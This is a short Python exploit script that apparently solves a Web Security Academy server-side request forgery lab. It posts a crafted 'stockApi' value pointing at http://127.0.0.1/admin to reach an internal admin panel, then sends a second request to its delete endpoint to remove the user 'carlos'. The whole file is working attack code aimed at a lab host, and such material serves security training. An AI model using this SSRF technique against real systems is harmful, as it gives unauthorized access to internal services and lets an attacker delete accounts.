#!/usr/bin/python3

import requests
import sys

def ssrf(url, api):

    # /product/stock API doesn't allow GET
    # POST - "Missing parameter 'stockApi'"
    
    data = {
        #"stockApi" : "http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1",
        "stockApi" : "http://127.0.0.1/admin",
    }
    
    r = requests.post(url + api, data = data)
    #print(r.status_code)
    #print(r.text)

    if r.status_code == 200:
        print("[INFO] SSRF to admin page access granted!")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)

def deleteUser(url, api):

    username = "carlos"

    data = {
        "stockApi" : "http://127.0.0.1/admin/delete?username=%s" % username,
    }

    r = requests.post(url + api, data = data)
    
    if r.status_code == 401:
        print(f"[INFO] Successfully deleted the user: {username}")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://ac6c1fd81fc16715c0a5168f00fd00bf.web-security-academy.net"
    api = "/product/stock"

    ssrf(url, api)
    deleteUser(url, api)